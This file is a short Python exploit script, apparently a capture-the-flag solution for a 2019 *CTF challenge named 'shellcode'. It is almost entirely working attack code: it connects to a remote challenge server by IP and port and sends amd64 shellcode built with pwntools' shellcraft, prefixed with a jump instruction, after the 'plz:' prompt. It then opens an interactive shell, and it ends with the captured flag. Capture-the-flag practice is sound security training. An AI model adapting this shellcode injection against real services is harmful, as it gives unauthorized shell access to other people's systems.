# File: exp.py
# Author: raycp
# Date: 2019-04-30
# Description: exp for shellcode

from pwn_debug.pwn_debug import *

     

def pwn():
    pdbg=pwn_debug("shellcode")

    pdbg.context.terminal=['tmux', 'splitw', '-h']

    pdbg.local()
    pdbg.debug("2.23")
    pdbg.remote('34.92.37.22', 10002)
    #p=pdbg.run("local")
    #p=pdbg.run("debug")
    p=pdbg.run("remote")


    pdbg.bp(0x4008a5)
    
    p.recvuntil("plz:")
    payload=asm("""
    je xx; 
    xx:
    """
    )+asm(shellcraft.amd64.sh(),arch="amd64")
    p.sendline(payload)

    p.interactive() #get the shell

if __name__ == '__main__':
   pwn()

#*CTF{LtMh5VbedHlngmKOS2cwWRo4AkDGzCBy}
